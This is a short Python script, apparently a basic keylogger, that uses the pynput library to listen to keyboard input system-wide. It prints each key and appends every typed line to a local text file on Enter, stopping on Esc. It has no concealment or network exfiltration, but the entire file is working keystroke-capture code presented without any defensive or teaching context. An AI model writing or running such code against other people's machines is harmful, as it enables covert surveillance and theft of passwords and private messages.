import pynput
from pynput.keyboard import Listener, Key

lines = ""

def write_file(lines):
    try:
        with open("test_file.txt", "a") as file:
            file.write(lines + "\n")
    except Exception as e:
        print("Error writing to file:", e)

def on_press(key):
    global lines
    print(key)
    if key == Key.enter:
        write_file(lines)
        lines = ""
    elif hasattr(key, 'char'):
        lines += key.char
    elif key == Key.space:
        lines += " "

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

